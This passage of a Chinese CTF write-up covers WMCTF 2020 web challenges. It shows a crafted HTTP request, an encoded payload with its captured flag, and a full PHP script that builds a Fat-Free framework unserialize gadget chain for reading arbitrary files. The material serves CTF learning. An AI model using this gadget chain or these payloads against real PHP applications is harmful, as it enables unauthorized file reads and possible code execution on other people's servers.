&amp;xn=&amp;xo=&amp;xp=&amp;xq=&amp;xr=&amp;xs=&amp;xt=&amp;xu=&amp;xv=&amp;xw=&amp;xx=&amp;xy=&amp;xz=&amp;xA=&amp;xB=&amp;xC=&amp;xD=&amp;xE=&amp;xF=&amp;xG=&amp;xH=&amp;xI=&amp;xJ=&amp;xK=&amp;xL=&amp;xM=&amp;xN=&amp;xO=&amp;xP=&amp;xQ=&amp;xR=&amp;xS=&amp;xT=&amp;xU=&amp;xV=&amp;xW=&amp;xX=&amp;xY=&amp;xZ=&amp;x0=&amp;x1=&amp;x2=&amp;x3=&amp;x4=&amp;x5=&amp;x6=&amp;x7=&amp;x8=&amp;x9=&amp;ya=&amp;yb=&amp;yc=&amp;yd=&amp;ye=&amp;yf=&amp;yg=&amp;yh=&amp;yi=&amp;yj=&amp;yk=&amp;yl=&amp;ym=&amp;yn=&amp;yo=&amp;yp=&amp;yq=&amp;yr=&amp;ys=&amp;yt=&amp;yu=&amp;yv=&amp;yw=&amp;yx=&amp;yy=&amp;yz=&amp;yA=&amp;yB=&amp;yC=&amp;yD=&amp;yE=&amp;yF=&amp;yG=&amp;yH=&amp;yI=&amp;yJ=&amp;yK=&amp;yL=&amp;yM=&amp;yN=&amp;yO=&amp;yP=&amp;yQ=&amp;yR=&amp;yS=&amp;yT=&amp;yU=&amp;yV=&amp;yW=&amp;yX=&amp;yY=&amp;yZ=&amp;y0=&amp;y1=&amp;y2=&amp;y3=&amp;y4=&amp;y5=&amp;y6=&amp;y7=&amp;y8=&amp;y9=&amp;za=&amp;zb=&amp;zc=&amp;zd=&amp;ze=&amp;zf=&amp;zg=&amp;zh=&amp;zi=&amp;zj=&amp;zk=&amp;zl=&amp;zm=&amp;zn=&amp;zo=&amp;zp=&amp;zq=&amp;zr=&amp;zs=&amp;zt=&amp;zu=&amp;zv=&amp;zw=&amp;zx=&amp;zy=&amp;zz=&amp;zA=&amp;zB=&amp;zC=&amp;zD=&amp;zE=&amp;zF=&amp;zG=&amp;zH=&amp;zI=&amp;zJ=&amp;zK=&amp;zL=&amp;zM=&amp;zN=&amp;zO=&amp;zP=&amp;zQ=&amp;zR=&amp;zS=&amp;zT=&amp;zU=&amp;zV=&amp;zW=&amp;zX=&amp;zY=&amp;zZ=&amp;z0=&amp;z1=&amp;z2=&amp;z3=&amp;z4=&amp;z5=&amp;z6=&amp;z7=&amp;z8=&amp;z9=&amp;Aa=&amp;Ab=&amp;Ac=&amp;Ad=&amp;Ae=&amp;Af=&amp;Ag=&amp;Ah=&amp;Ai=&amp;Aj=&amp;Ak=&amp;Al=&amp;Am=&amp;An=&amp;Ao=&amp;Ap=&amp;Aq=&amp;Ar=&amp;As=&amp;At=&amp;Au=&amp;Av=&amp;Aw=&amp;Ax=&amp;Ay=&amp;Az=&amp;AA=&amp;AB=&amp;AC=&amp;AD=&amp;AE=&amp;AF=&amp;AG=&amp;AH=&amp;AI=&amp;AJ=&amp;AK=&amp;AL=&amp;AM=&amp;AN=&amp;AO=&amp;AP=&amp;AQ=&amp;AR=&amp;AS=&amp;AT=&amp;AU=&amp;AV=&amp;AW=&amp;AX=&amp;AY=&amp;AZ=&amp;A0=&amp;A1=&amp;A2=&amp;A3=&amp;A4=&amp;A5=&amp;A6=&amp;A7=&amp;A8=&amp;A9=&amp;Ba=&amp;Bb=&amp;Bc=&amp;Bd=&amp;Be=&amp;Bf=&amp;Bg=&amp;Bh=&amp;Bi=&amp;Bj=&amp;Bk=&amp;Bl=&amp;Bm=&amp;Bn=&amp;Bo=&amp;Bp=&amp;Bq=&amp;Br=&amp;Bs=&amp;Bt=&amp;Bu=&amp;Bv=&amp;Bw=&amp;Bx=&amp;By=&amp;Bz=&amp;BA=&amp;BB=&amp;BC=&amp;BD=&amp;BE=&amp;BF=&amp;BG=&amp;BH=&amp;BI=&amp;BJ=&amp;BK=&amp;BL=&amp;BM=&amp;BN=&amp;BO=&amp;BP=&amp;BQ=&amp;BR=&amp;BS=&amp;BT=&amp;BU=&amp;BV=&amp;BW=&amp;BX=&amp;BY=&amp;BZ=&amp;B0=&amp;B1=&amp;B2=&amp;B3=&amp;B4=&amp;B5=&amp;B6=&amp;B7=&amp;B8=&amp;B9=&amp;Ca=&amp;Cb=&amp;Cc=&amp;Cd=&amp;Ce=&amp;Cf=&amp;Cg=&amp;Ch=&amp;Ci=&amp;Cj=&amp;Ck=&amp;Cl=&amp;Cm=&amp;Cn=&amp;Co=&amp;Cp=&amp;Cq=&amp;Cr=&amp;Cs=&amp;Ct=&amp;Cu=&amp;Cv=&amp;Cw=&amp;Cx=&amp;Cy=&amp;Cz=&amp;CA=&amp;CB=&amp;CC=&amp;CD=&amp;CE=&amp;CF=&amp;CG=&amp;CH=&amp;CI=&amp;CJ=&amp;CK=&amp;CL=&amp;CM=&amp;CN=&amp;CO=&amp;CP=&amp;CQ=&amp;CR=&amp;CS=&amp;CT=&amp;CU=&amp;CV=&amp;CW=&amp;CX=&amp;CY=&amp;CZ=&amp;C0=&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;C9=&amp;Da=&amp;Db=&amp;Dc=&amp;Dd=&amp;De=&amp;Df=&amp;Dg=&amp;Dh=&amp;Di=&amp;Dj=&amp;Dk=&amp;Dl=&amp;Dm=&amp;Dn=&amp;Do=&amp;Dp=&amp;Dq=&amp;Dr=&amp;Ds=&amp;Dt=&amp;Du=&amp;Dv=&amp;Dw=&amp;Dx=&amp;Dy=&amp;Dz=&amp;DA=&amp;DB=&amp;DC=&amp;DD=&amp;DE=&amp;DF=&amp;DG=&amp;DH=&amp;DI=&amp;DJ=&amp;DK=&amp;DL=&amp;DM=&amp;DN=&amp;DO=&amp;DP=&amp;DQ=&amp;DR=&amp;DS=&amp;DT=&amp;DU=&amp;DV=&amp;DW=&amp;DX=&amp;DY=&amp;DZ=&amp;D0=&amp;D1=&amp;D2=&amp;D3=&amp;D4=&amp;D5=&amp;D6=&amp;D7=&amp;D8=&amp;D9=&amp;Ea=&amp;Eb=&amp;Ec=&amp;Ed=&amp;Ee=&amp;Ef=&amp;Eg=&amp;Eh=&amp;Ei=&amp;Ej=&amp;Ek=&amp;El=&amp;Em=&amp;En=&amp;Eo=&amp;Ep=&amp;Eq=&amp;Er=&amp;Es=&amp;Et=&amp;Eu=&amp;Ev=&amp;Ew=&amp;Ex=&amp;Ey=&amp;Ez=&amp;EA=&amp;EB=&amp;EC=&amp;ED=&amp;EE=&amp;EF=&amp;EG=&amp;EH=&amp;EI=&amp;EJ=&amp;EK=&amp;EL=&amp;EM=&amp;EN= HTTP/1.1</span><br><span class="line">Host: web_checkin2.wmctf.wetolink.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试发现，就如我们猜想的一样。</p>
<p>访问<code>http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code><br>拿到flag:<code>WMCTF&#123;3C5E9715-5BEE-4D33-8627-DE10E5D92715&#125;</code></p>
<h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>这题本地测试成功远程不行，不知道为啥，静等其他人的wp</p>
<p>代码很简单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">	trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line"><span class="variable">$f3</span>-&gt;config(<span class="string">&#x27;config.ini&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">	<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$f3</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;just get me a,don&#x27;t do anything else&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>又是一题反序列化</p>
<p>老规矩开局找入口点：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png" alt="image11496"></p>
<p>这里只有这一个入口点，这个入口点还挺不错的。</p>
<p>接下来我们可以考虑调用魔术方法或者是利用<code>$func($this)</code>来构造下一步</p>
<p>这里可以利用的魔术方法有：<code>__get</code>和<code>__call</code>，找了一波没啥好用的魔术方法，那么我们就利用<code>$func($this)</code>吧</p>
<p>接下来我们有两种思路：</p>
<ol>
<li>扩宽道路，就是找一个函数，里面调用有意思的方法的</li>
<li>确定pop链尾</li>
</ol>
<p>我这里是先扩宽反序列化的道路再去找链尾的，毕竟可以当链尾的太多了</p>
<p>慢慢找过去发现一个有意思的方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png" alt="image11818"></p>
<p>这里可以调用:<code>$func($url,false,true)</code>，如果我们能控制<code>$url</code>那么我们就能舒服多了，那么我们接下来就是要找个可以控制<code>$url</code>的地方</p>
<p>找着找着发现了<code>Base::run</code>这个方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>可以直接利用<code>$func($this);</code>来调用它（对于用户自定义的函数/方法，多一些参数没啥影响，但是对大部分自带的函数就不行了，原因估计是自带的函数都是c编写的固定参数的函数），我们来看下它调用<code>reroute</code>的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png" alt="image12152"></p>
<p>我们可以看到确实<code>$url</code>是我们可以控制的，现在就是要让语句执行到这里，这个没啥好说的，有耐心一点慢慢调就ok了，直接换上payload了：</p>
<p>接下来就是需要找到一个合适的函数，本地fuzz自带的函数发现，exec是可以的，虽然它会报错</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png" alt="image12361"></p>
<p>amazing，划重点这是要考的，虽然本地可以，但是</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png" alt="image12473"></p>
<p>服务器上去测试就segment fault了，黯然离去.jpg</p>
<p>接下来我们只能去找框架的函数了</p>
<p>找着找着我找到了：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png" alt="image12618"></p>
<p>这样一个东西，这个函数就很nice</p>
<p>我们传入<code>WEB-&gt;send(&#39;/flag&#39;,false,true);</code>那么我们就能得到<code>/flag</code>的内容了</p>
<p>最后payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">id</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">socket</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">flag</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">verb</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">uri</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">headers</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \base(),<span class="string">&quot;run&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="variable">$addr</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$ctx</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$wait</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$sockets</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$protocol</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$agents</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span> = [<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="string">&quot;bbbbb&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addr = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Traversable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span> <span class="keyword">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="comment">//! Flat-file DB wrapper</span></span><br><span class="line">            <span class="variable">$db</span>,</span><br><span class="line">            <span class="comment">//! Data file</span></span><br><span class="line">            <span class="variable">$file</span>,</span><br><span class="line">            <span class="comment">//! Document identifier</span></span><br><span class="line">            <span class="variable">$id</span>,</span><br><span class="line">            <span class="comment">//! Document contents</span></span><br><span class="line">            <span class="variable">$document</span>=[],</span><br><span class="line">            <span class="comment">//! field map-reduce handlers</span></span><br><span class="line">            <span class="variable">$_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \base();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement getIterator() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement exists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement set() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement get() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement clear() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetExists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetGet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Prefab</span> &#123;</span><br><span class="line">        <span class="title">static</span> <span class="title">function</span> <span class="title">instance</span>() &#123;</span><br><span class="line">            <span class="title">if</span> (!<span class="title">Registry</span>::<span class="title">exists</span>($<span class="title">class</span>=<span class="title">get_called_class</span>())) &#123;</span><br><span class="line">                $<span class="title">ref</span>=<span class="title">new</span> <span class="title">ReflectionClass</span>($<span class="title">class</span>);</span><br><span class="line">                <span class="variable">$args</span>=func_get_args();</span><br><span class="line">                Registry::set(<span class="variable">$class</span>,</span><br><span class="line">                    <span class="variable">$args</span>?<span class="variable">$ref</span>-&gt;newinstanceargs(<span class="variable">$args</span>):<span class="keyword">new</span> <span class="variable">$class</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Registry::get(<span class="variable">$class</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Base</span> <span class="keyword">extends</span> <span class="title">Prefab</span> <span class="keyword">implements</span> <span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span></span><br><span class="line">            <span class="variable">$hive</span>,</span><br><span class="line">            <span class="variable">$init</span>,</span><br><span class="line">            <span class="variable">$languages</span>,</span><br><span class="line">            <span class="variable">$locks</span>=[],</span><br><span class="line">            <span class="variable">$fallback</span>=<span class="string">&#x27;en&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hive=[</span><br><span class="line">                <span class="string">&quot;ROUTES&quot;</span>=&gt;[<span class="string">&#x27;/flag/&#x27;</span>=&gt;[[<span class="string">&#x27;GET&#x27;</span>=&gt;<span class="number">1</span>]],<span class="string">&quot;2&quot;</span>=&gt;<span class="number">1</span>],</span><br><span class="line">                <span class="string">&quot;PATH&quot;</span>=&gt;<span class="string">&#x27;/flag/&#x27;</span>,<span class="comment">#$url</span></span><br><span class="line">                <span class="string">&quot;QUERY&quot;</span>=&gt;<span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;VERB&quot;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PARAMS&quot;</span>=&gt;[],</span><br><span class="line">                <span class="string">&quot;ONREROUTE&quot;</span>=&gt;<span class="string">&quot;WEB-&gt;send&quot;</span>,<span class="comment">#$func</span></span><br><span class="line">                <span class="string">&quot;CLI&quot;</span>=&gt;<span class="string">&#x27;123&#x27;</span></span><br><span class="line">                ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Magic</span> <span class="keyword">implements</span> \<span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> \CLI\WS(<span class="keyword">new</span> \CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png" alt="image16897"></p>
<p>然而在题目中它虽然执行了<code>WEB-&gt;send</code>方法（根据错误信息得知），但是并不会返回<code>/flag</code>（所有文件都读不了），希望有看到的师傅给个解答</p>
<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>果然是我一句魔术方法里面没啥好用的这一句话断送了我的flag，有这样一个魔术方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png" alt="image17108"></p>
